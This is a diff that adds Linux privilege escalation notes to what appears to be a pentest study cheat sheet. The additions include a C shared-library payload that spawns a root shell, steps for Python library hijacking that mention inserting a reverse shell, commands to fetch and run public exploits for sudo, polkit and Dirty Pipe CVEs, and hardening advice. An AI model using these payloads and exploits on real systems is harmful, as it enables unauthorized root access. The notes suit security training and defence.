@@ -662,8 +662,191 @@ gcc -fPIC -shared -o root.so root.c -nostartfiles
 ```
 
 ###### Shared Object Hijacking
+- We can use ldd to print the shared object required by a binary or shared object. Ldd displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies
+    ```bash
+    ldd <fileName>
+    ```
+- Inspect run path
+    ```bash
+    readelf -d <FileName>  | grep PATH
+    ```
+- create a shell root
+    ```c
+    #include<stdio.h>
+    #include<stdlib.h>
+    
+    void dbquery() {
+        printf("Malicious library loaded\n");
+        setuid(0);
+        system("/bin/sh -p");
+    } 
+    ```
+- put in the runpath
+    - ```bash
+      gcc src.c -fPIC -shared -o < RunPath/objectName | /development/libshared.so>
+      ```
+
+###### Python Library Hijacking
+
+There are three basic vulnerabilities where hijacking can be used:
+
+  1.  Wrong write permissions
+  2. Library Path
+  3. PYTHONPATH environment variable
+
+- Wrong permission
+    1. Find file permissions
+        ```bash
+        # check files which have SUID ( read ) SGID ( write) permissions
+        find . -perm /4000 | /2000 | /6000 
+        ls -la
+        ```
+    2.  Read python source code 
+    3.  Search vulnerable functions 
+        ```bash
+        grep -r "< functionName | def virtual_memory>" < FunctionLibraryInternPath | /usr/local/lib/python3.8/dist-packages/psutil/*>
+        ``` 
+    4. list vulnerable functions source file permissions
+        ```bash
+        ls -l <VulnerableFunctionSourceFilePath>
+        ```
+    5. Modify function by inserting a reverse shell to our main device
+
+    <br/>
+
+- Library Path
+```bash
+#1. show installation location of file
+pip3 show <libName>
+#2. find directory permissions
+ls -la <DirName>
+#3. find vulnerability
+#4. create custom lib with rce to have root
+#5. Run with sudo ( sudo DirPath pythonFIleName )
+```
+
+- PYTHONPATH Environment Variable
+```bash
+# see if we can use python with sudo
+sudo -l
+# set my own 
+sudo PYTHONPATH=<Path | /tmp/ > <PythonPath | /usr/bin/python3> <LibFileName>
+```
 
 
+
+## Recent 0-Days
+
+###### SUDO
+- The /etc/sudoers file specifies which users or groups are allowed to run specific programs and with what privileges.
+```bash
+# find sudo version
+sudo -V | head -n1
+
+# find system version
+cat /etc/lsb-release
+
+sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
+
+# CVE-2021-3156
+# 1.8.31 - Ubuntu 20.04
+# 1.8.27 - Debian 10
+# 1.9.2 - Fedora 33
+# and others
+git clone https://github.com/blasty/CVE-2021-3156.git
+cd CVE-2021-3156
+make
+./sudo-hax-me-a-sandwich
+./sudo-hax-me-a-sandwich <VersionNumberProposed>
+
+
+# CVE-2019-14287
+#Prerequist : It had to allow a user in the /etc/sudoers file to execute a specific command.
+cat /etc/passwd | grep <UserName>
+sudo -u#-1 <CmdAllowed>
+```
+
+###### Polkit
+- PolicyKit (polkit) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so. To check whether the user software is authorized for this instruction, polkit is asked. 
+
+Polkit works with two groups of files.
+
+1. actions/policies (/usr/share/polkit-1/actions)
+2. rules (/usr/share/polkit-1/rules.d)
+
+- Custom rules can be placed in the directory /etc/polkit-1/localauthority/50-local.d with the file extension .pkla.
+
+- PolKit also comes with three additional programs:
+
+1. pkexec - runs a program with the rights of another user or with root rights
+2. pkaction - can be used to display actions
+3. pkcheck - this can be used to check if a process is authorized for a specific action
+
+```bash
+# pkexec -u <user> <command>
+# it uses  CVE-2021-4034
+# find poc on github and use it 
+```
+
+###### Dirty Pipe
+- CVE-2022-0847
+- In simple terms, this vulnerability allows a user to write to arbitrary files as long as he has read access to these files. It is also interesting to note that Android phones are also affected.
+```bash
+# exploit 
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+cd CVE-2022-0847-DirtyPipe-Exploits
+bash compile.sh
+```
+
+- We will have 2 exploit 
+    -  The first exploit version (exploit-1) modifies the /etc/passwd and gives us a prompt with root privileges.
+    ```bash
+    # verify kernel version
+    uname -r
+    # exploit 1 
+    ./exploit-1
+    ```
+    - With the help of the 2nd exploit version (exploit-2), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries
+    ```bash
+    find / -perm -4000 2>/dev/null
+    # Then we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.
+    ./exploit-2 <binPath>
+    ```
+        
+###### Netfilter
+- Netfilter is a Linux kernel module that provides, among other things, packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and rules. 
+- When the module is activated, all IP packets are checked by the Netfilter before they are forwarded to the target application of the own or remote system. 
+- `CVE-2021-22555 => Vulnerable kernel versions: 2.6 - 5.11`
+-  `CVE-2022-1015`
+-  `CVE-2023-32233` 
+- ` CVE-2022-25636 => affects Linux kernel 5.4 through 5.6.10. ` => see Nick Gregory article
+    - called anonymous sets in nf_tables by using the Use-After-Free vulnerability in the Linux Kernel up to version 6.3.1. These nf_tables are temprorary workspaces for processing batch requests and once the processing is done, these anonymous sets are supposed to be cleared out (Use-After-Free) so they cannot be used anymore.
+- `CVE-2023-32233` 
+- 
+## Hardening Considerations ( durcissement )
+
+-  Linux hardening can eliminate most, if not all, opportunities for local privilege escalation
+
+- DO updates 
+ 
+
+- Audit writable files and directories and any binaries set with the SUID bit.
+- Ensure that any cron jobs and sudo privileges specify any binaries using the absolute path.
+- Do not store credentials in cleartext in world-readable files.
+- Clean up home directories and bash history.
+- Ensure that low-privileged users cannot modify any custom libraries called by programs.
+- Remove any unnecessary packages and services that potentially increase the attack surface.
+- Consider implementing SELinux, which provides additional access controls on the system.
+
+- We should limit the number of user accounts and admin accounts on each system, ensure that logon attempts (valid/invalid) are logged and monitored.
+
+-  We should check that users are not placed into groups that give them excessive rights not needed for their day-to-day tasks and limit sudo rights based on the principle of least privilege.
+- Templates exist for configuration management automation tools such as Puppet, SaltStack, Zabbix and Nagios to automate such checks and can be used to push messages to a Slack channel or email box as well as via other methods. Remote actions (Zabbix) and Remediation Actions (Nagios) can be used to find and auto correct these issues over a fleet of nodes. Tools such as Zabbix also feature functions such as checksum verification, which can be used for both version control and to confirm sensitive binaries have not been tampered with.
+- Perform periodic security and configuration checks of all systems. There are several security baselines such as the DISA 
+-  ISO27001, PCI-DSS, and HIPAA which can be used by an organization to help establish security baselines. 
+- Pentest
+- box-checking
+- use Lynis tool ( github )
 ## Ressources
 
 - [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
